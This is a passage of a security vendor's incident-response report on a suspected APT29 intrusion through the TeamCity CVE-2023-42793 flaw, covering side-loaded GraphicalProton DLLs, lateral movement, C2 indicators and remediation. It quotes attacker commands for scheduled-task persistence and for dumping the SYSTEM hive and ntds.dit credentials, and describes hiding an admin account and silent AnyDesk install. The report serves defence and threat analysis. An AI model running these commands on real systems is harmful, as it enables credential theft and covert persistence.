<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">schtasks.exe /create /SC ONSTART /tn<br />
 &quot;\Microsoft\Windows\IISUpdateService&quot; /tr<br />
 &quot;C:\Windows\WinStore\iisexpresstray.exe&quot; /RU &quot;SYSTEM&quot; /f</span></span></span></p>
<p>After the scheduled task was created, the threat actor executed the scheduled task using the following command:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">schtasks.exe /run /tn &quot;\Microsoft\Windows\IISUpdateService&quot;</span></span></span></p>
<p>When the 'iisexpresstray.exe' file was executed on the HOST_1_TEAMCITY, a separate thread was created by the malicious DLL file that tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in Figure 12.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_444708254.img.png/1702072364861/fig12-teamcity-fortiedr-blocked-access-to-lsass-exe.png" data-title="Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_444708254.img.png/1702072364861/fig12-teamcity-fortiedr-blocked-access-to-lsass-exe.png" alt="Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of the executables listed in Table 3 were recovered from the opendir<a href="#_ftn15" name="_ftnref1">[15]</a> web server.</p>
<p> </p>
<table border="1" cellspacing="0" cellpadding="0" width="90%" align="center">
<tbody><tr><td width="54" valign="top"><p><b>Sr. No.</b></p>
</td>
<td width="144" valign="top"><p><b>File Name</b></p>
</td>
<td width="469" valign="top"><p><b>Description</b></p>
</td>
</tr><tr><td width="54" valign="top"><p>1</p>
</td>
<td width="144" valign="top"><p>iisexpresstray.exe</p>
</td>
<td width="469" valign="top"><p>Legitimate IIS Express exe used for the execution of malicious DLL mscorees.dll</p>
</td>
</tr><tr><td width="54" valign="top"><p>2</p>
</td>
<td width="144" valign="top"><p>MpCmdRun.exe</p>
</td>
<td width="469" valign="top"><p>Legitimate Defender command line utility used for execution of malicious DLL MpCmdHelp.dll</p>
</td>
</tr><tr><td width="54" valign="top"><p>3</p>
</td>
<td width="144" valign="top"><p>FlashUtil_ActiveX.exe</p>
</td>
<td width="469" valign="top"><p>Legitimate Flash exe used for the execution of malicious DLL oleac.dll</p>
</td>
</tr><tr><td width="54" valign="top"><p>4</p>
</td>
<td width="144" valign="top"><p>zabbix_agentd.exe</p>
</td>
<td width="469" valign="top"><p>Legitimate executable to Zabbix software used to load the malicious DLL pdhui_1.dll</p>
</td>
</tr></tbody></table>
<h5 style="text-align: center;"><span style="font-weight: normal;">Table 3. List of legitimate software executables observed in the attack and on the C2 server, which are used to load malicious DLL files.</span></h5>
<div><span style="font-weight: normal;"> </span></div>


</div>


    
    
    <div class="cmp cmp-text">
  <p>Since FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to dump the registry using Windows utility reg.exe directly through further TeamCity exploitation. Unfortunately for the main threat actor, FortiEDR blocked this execution due to the triggered rules 'Access to Critical System Information' and 'Connection Attempt from a Hidden Process' under its 'Exfiltration Prevention' security policy. A screenshot of the related FortiEDR event is shown in Figure 13.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1993361612.img.png/1702072439482/fig13-teamcity-attempt-to-dump-system-credentials.png" data-title="Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1993361612.img.png/1702072439482/fig13-teamcity-attempt-to-dump-system-credentials.png" alt="Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR" class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>These attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these techniques. The associated EDR security events also generated multiple alerts. Unfortunately, the targeted organization made numerous broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were incorrectly assessed as a false positive. These exceptions are outlined below:</p>
<ol>
<li>allow rundll32.exe to run AclNumsInverHost.dll when rundll32.exe is executed by cmd.exe.</li>
<li>allow reg.exe to run as a hidden process</li>
<li>allow reg.exe to access critical system information (credential dumping)</li>
<li>allow natid.sys to be loaded (a suspicious driver dropped by the threat actor)</li>
<li>allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any lsass.exe process</li>
<li>allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any svchost.exe process</li>
<li>allow any execution of PowerShell and associated rule violations</li>
</ol>
<p>These exceptions removed the constraints around the adversary's ability to fully employ their TeamCity exploitation, allowing the main threat actor to continue their execution unrestricted by FortiEDR.</p>
<p>After these exceptions were set, the main threat actor was able to successfully dump the registry of the Windows host HOST_1_TEAMCITY to gain access to local user credentials (T1003.002)<a href="#_ftn16" name="_ftnref1">[16]</a>. To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive (T1003.002<a href="#_ftn17" name="_ftnref2">[17]</a>) using the command below:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">reg.exe save HKLM\SYSTEM “C:\Windows\temp\1\sy.sa” /y</span></span></span></p>
<p>This can be seen in the FortiEDR Threat Hunting event shown in Figure 14.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1607333618.img.png/1702072457655/fig14-fortiedr-threat-hunting-event-associated-with-reg-exe.png" data-title="Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1607333618.img.png/1702072457655/fig14-fortiedr-threat-hunting-event-associated-with-reg-exe.png" alt="Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>At this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a more robust foothold on the HOST_1_TEAMCITY. They used their access to create a Windows account, 'oldadministrator' (T1136.001<a href="#_ftn18" name="_ftnref1">[18]</a>), added the newly created account to the local administrators group, and made the account a special account by adding it to the registry path 'NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist' with the DWORD value 0. When a Windows user account is added to this registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever used this newly created 'oldadministrator' account. Log events associated with these activities can be observed in the teamcity-server.log snippet shown in Figure 15.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_491169694.img.png/1702072476968/fig15-teamcity-extract-from-teamcity-app-logs.png" data-title="Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_491169694.img.png/1702072476968/fig15-teamcity-extract-from-teamcity-app-logs.png" alt="Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>At this time, the host HOST_1_TEAMCITY was patched for CVE-2023-42793. The IR team verified the patch was successful and that there was no further exploitation of this vulnerability on this host following the installation of the patch. Unfortunately, the threat actor had already created alternative access through their GraphicalProton implant and had already begun laterally moving to other hosts within the victim network through SMB, RDP, and remote WMIC commands.</p>
<p>The hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047)<a href="#_ftn19" name="_ftnref1">[19]</a> from the original compromised host, HOST_1_TEAMCITY. The network connections linked to this behavior were established using explicit credentials. This indicates that the main threat actor had successfully pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to execute a GraphicalProton DLL through either rundll32 proxy execution like that demonstrated in the previously discussed scheduled task or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_87480866.img.png/1702072545602/fig16-teamcity-windows-log-screenshot-showing-wmic-execution.png" data-title="Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_87480866.img.png/1702072545602/fig16-teamcity-windows-log-screenshot-showing-wmic-execution.png" alt="Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR" style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>On the HOST_2_SVR, the main threat actor employed a different lateral movement technique by establishing an RDP connection from the HOST_1_TEAMCITY. This connection was used to create multiple suspicious files in the 'C:\Windows\SchCache’ directory on HOST_2_SVR. Two DLL files (‘oleacc.dll’ and ‘oleac.dll’) and one executable file (‘FlashUtil_ActiveX.exe’) were created in this directory. When the IR team ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for GraphicalProton. The remaining files, oleacc.dll and FlashUtil_ActiveX.exe, were determined to be non-malicious Microsoft-signed files.</p>
<p>The main threat actor then created persistence for this file through a scheduled task. This time, the task was named 'WindowsActiveX' and was created to execute the 'C:\Windows\SchCache\FlashUtil_ActiveX.exe' file when Windows starts. This shows the use of another legitimate executable to perform search order hijacking to load a malicious GraphicalProton DLL. The command used to create this scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_267756856.img.png/1702072568436/fig17-teamcity-fortiedr-threat-hunting-event.png" data-title="Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_267756856.img.png/1702072568436/fig17-teamcity-fortiedr-threat-hunting-event.png" alt="Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe" style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>In another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility ‘ntdsutil.exe’ on the host HOST_2_SVR. They tried to dump credentials using the following command:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\tempp' q q</span></span></span></span></p>
<p>This command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case, ‘C:\tempp’). Threat actors can often dump password hashes from these files offline using tools like mimikatz.<a href="#_ftn20" name="_ftnref1">[20]</a> FortiEDR blocked this activity, and the associated security event can be observed in Figure 18.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_889835321.img.png/1702072587048/fig18-teamcity-execution-of-ntdsutil-to-dump-ntds-file.png" data-title="Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_889835321.img.png/1702072587048/fig18-teamcity-execution-of-ntdsutil-to-dump-ntds-file.png" alt="Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>In addition to this scheduled task, the IR team found another GraphicalProton DLL in the ‘C:\Program Files\Windows Defender’ directory. This directory contained an executable PE file, ‘MpCmdRun.exe,’ and DLL files, ‘MpCmdHelp.dll’ and ‘MpClient.dll.’ One of the files (MpCmdHelp.dll) matched against the Yara rule for malware GraphicalProton, and the second DLL file, MpClient.dll, is a legitimate library used by ‘MpCmdRun.exe.’ Like the ‘FlashUtil_ActiveX.exe’ example discussed earlier in this report, the ‘MpCmdRun.exe’ is a legitimate binary vulnerable to search order hijacking. The ‘MpCmdRun.exe’ binary is an official command-line tool used to perform various operations related to Microsoft Defender Antivirus. The default path of this binary is ‘C:\Program Files\Windows Defender.’</p>
<p>At this investigation stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This scanning identified DLL files matching the GraphicalProton signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both hosts, a task named ‘WindowsDefenderService’ that executed the GraphicalProton DLLs was created, matching the tradecraft of the previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_518915207.img.png/1702072611576/fig19-teamcity-schedule-task-file-for-proxy-execution.png" data-title="Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_518915207.img.png/1702072611576/fig19-teamcity-schedule-task-file-for-proxy-execution.png" alt="Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The IR team also found a network login to HOST_5_SVR from the primary infected HOST_1_TEAMCITY host.</p>
<p>Shortly after this login event, an instance of rundll32 used for proxy execution of another GraphicalProton sample was started. However, the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any known IOCs. However, it has been included for completeness. Significant strings extracted from the memory dump can be seen in Figure 20.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1513237146.img.png/1702072631911/fig20-teamcity-strings-from-memory-analysis-crash-dump.png" data-title="Figure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1513237146.img.png/1702072631911/fig20-teamcity-strings-from-memory-analysis-crash-dump.png" alt="Figure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Similar network indicators were identified when we executed the AclNumsInvertHost.dll file using rundll32.exe in a virtual analysis environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the victim environment. The GraphicalProton report<a href="#_ftn21" name="_ftnref1">[21]</a> from Insikt Group from Recorded Future showed that researchers had previously observed GraphicalProton samples employ Microsoft OneDrive and Dropbox as part of their C2.</p>
<p>The malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed that the behavior of the multiple malicious DLL matches GraphicalProton malware behavior. The malicious DLL was communicating with Microsoft OneDrive, and the following information was obtained in JSON format from this communication.<br />
</p>
<p> </p>
<table border="1" cellspacing="0" cellpadding="0" align="center">
<tbody><tr><td width="131" valign="top"><p><b>Key</b></p>
</td>
<td width="475" valign="top"><p><b>Value</b></p>
</td>
</tr><tr><td width="131" valign="top"><p>@odata.context</p>
</td>
<td width="475" valign="top"><p>https://graph[.]microsoft[.]com/v1.0/$metadata#users('quentparoty%40outlook[.]com')/drive/root/$entit</p>
</td>
</tr><tr><td width="131" valign="top"><p>name</p>
</td>
<td width="475" valign="top"><p>blatant</p>
</td>
</tr><tr><td width="131" valign="top"><p>webUrl</p>
</td>
<td width="475" valign="top"><p>https://1drv[.]ms/f/s!AGVbcHFCdi2qmmw</p>
</td>
</tr><tr><td width="131" valign="top"><p>displayName</p>
</td>
<td width="475" valign="top"><p>quent-application</p>
</td>
</tr><tr><td width="131" valign="top"><p>driveId</p>
</td>
<td width="475" valign="top"><p>aa2d764271705b65</p>
</td>
</tr><tr><td width="131" valign="top"><p>driveType</p>
</td>
<td width="475" valign="top"><p>personal</p>
</td>
</tr><tr><td width="131" valign="top"><p>id</p>
</td>
<td width="475" valign="top"><p>AA2D764271705B65!106</p>
</td>
</tr><tr><td width="131" valign="top"><p>folder name</p>
</td>
<td width="475" valign="top"><p>quent-application</p>
</td>
</tr><tr><td width="131" valign="top"><p>path</p>
</td>
<td width="475" valign="top"><p>/drive/root:/Apps/quent-application</p>
</td>
</tr></tbody></table>
<p> </p>
<table border="1" cellspacing="0" cellpadding="0" align="center">
<tbody><tr><td width="131" valign="top"><p><b>Key</b></p>
</td>
<td width="468" valign="top"><p><b>Value</b></p>
</td>
</tr><tr><td width="131" valign="top"><p>@odata.context</p>
</td>
<td width="468" valign="top"><p>https://graph[.]microsoft[.]com/v1.0/$metadata#users('girmisdrong%40outlook.com')/drive/root/$entity</p>
</td>
</tr><tr><td width="131" valign="top"><p>name</p>
</td>
<td width="468" valign="top"><p>excerpt2002VI</p>
</td>
</tr><tr><td width="131" valign="top"><p>webUrl</p>
</td>
<td width="468" valign="top"><p>https://1drv[.]ms/f/s!AALb1YPGQLqThmw</p>
</td>
</tr><tr><td width="131" valign="top"><p>displayName</p>
</td>
<td width="468" valign="top"><p>GrimiApplication</p>
</td>
</tr><tr><td width="131" valign="top"><p>driveId</p>
</td>
<td width="468" valign="top"><p>93ba40c683d5db02</p>
</td>
</tr><tr><td width="131" valign="top"><p>driveType</p>
</td>
<td width="468" valign="top"><p>personal</p>
</td>
</tr><tr><td width="131" valign="top"><p>id</p>
</td>
<td width="468" valign="top"><p>93BA40C683D5DB02!103</p>
</td>
</tr><tr><td width="131" valign="top"><p>folder name</p>
</td>
<td width="468" valign="top"><p>GrimiApplication</p>
</td>
</tr><tr><td width="131" valign="top"><p>path</p>
</td>
<td width="468" valign="top"><p>/drive/root:/Apps/GrimiApplication</p>
</td>
</tr></tbody></table>
<p> </p>


</div>


    
    
    <div class="cmp cmp-text">
  <p>The analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to NtQueryObject to look for the “DebugObject” variable. It also has strings such as “Ollydbg,” probably to check if the Ollydbg.exe process is running. If the process is found running, the malware may then terminate itself.</p>
<p>Given our understanding of the main threat actor’s operations, we determined that persistence was still possible. The IR team provided recommendations on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions recommended are provided below:</p>
<ol>
<li>Blocking the IP addresses used by threat actors</li>
<li>Removing TeamCity software accounts created by threat actors</li>
<li>Removing Windows accounts created by threat actors</li>
<li>Removing backdoors created by threat actors</li>
<li>Removing malicious files dropped by threat actors</li>
</ol>
<p>After implementing these containment and remediation actions by the victim security team, no further malicious activity has been observed.</p>
<h3><span style="font-weight: normal;">Other Threat Actor Activity</span></h3>
<p>In addition to the main threat actor, there were other threat actors who exploited the TeamCity vulnerability. One of these threat actors used their RCE access through the exploit to create a new TeamCity user via the TeamCity API. They then added the ‘System administrator’ role to this newly created user account. No evidence was found to indicate that this newly created account was ever used once it was created. Logs related to this activity were recorded in the teamcity-server.log and can be seen in Figure 21.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_194813850.img.png/1702072658011/fig21-teamcity-log-showing-creation-new-user-admin-role.png" data-title="Figure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_194813850.img.png/1702072658011/fig21-teamcity-log-showing-creation-new-user-admin-role.png" alt="Figure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Another threat actor separately attempted to download and execute an executable from an Amazon S3 bucket. Using an Amazon S3 Bucket instead of a separate C2 for file downloads differs from the actions of the main threat actor. This is significant, as many organizations include Amazon Services URLs in their allowlist. The threat actor used the ‘DownloadFile’ method of the PowerShell ‘WebClient’ class to download the Amazon-hosted payload. The file was saved as ‘1.exe’ in the path ‘C:\Windows\Temp\1.exe’. After downloading this file, the threat actor attempted to execute it using the command ‘cmd.exe /c C:\Windows\Temp\1.exe’. Windows Defender logs indicate this file was detected as Trojan:Script/Phonzy.B!ml malware by Windows Defender shortly after download and was deleted before it could be executed. Associated log events within the teamcity-server.log linked to this download activity are shown in Figure 22.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_594904170.img.png/1702072685459/fig22-teamcity-log-showing-download-execution-1-exe.png" data-title="Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_594904170.img.png/1702072685459/fig22-teamcity-log-showing-download-execution-1-exe.png" alt="Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Another threat actor used their TeamCity exploit to download and execute the installer for legitimate remote access software AnyDesk on the HOST_1_TEAMCITY. The AnyDesk software was installed with the ‘--start-with-win' parameter, making it auto-start on boot. The ‘--silent’ parameter was also used, which prevents the AnyDesk application from showing any messages or errors during execution. The threat actor then set a password to AnyDesk and executed it with the ‘--get-id' parameter to retrieve the AnyDesk-ID. This ID is used to connect to an instance of AnyDesk. This software is an implementation of a command-and-control technique (T1219<a href="#_ftn22" name="_ftnref1">[22]</a>) and also supports persistence as the threat actor can use the AnyDesk-ID to connect to a running instance of the software. Log events associated with these activities in the teamcity-server.log snippet are shown in Figure 23.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_920025398.img.png/1702072701319/fig23-teamcity-log-showing-installation-execution-anydesk-remote-access-tool.png" data-title="Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_920025398.img.png/1702072701319/fig23-teamcity-log-showing-installation-execution-anydesk-remote-access-tool.png" alt="Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
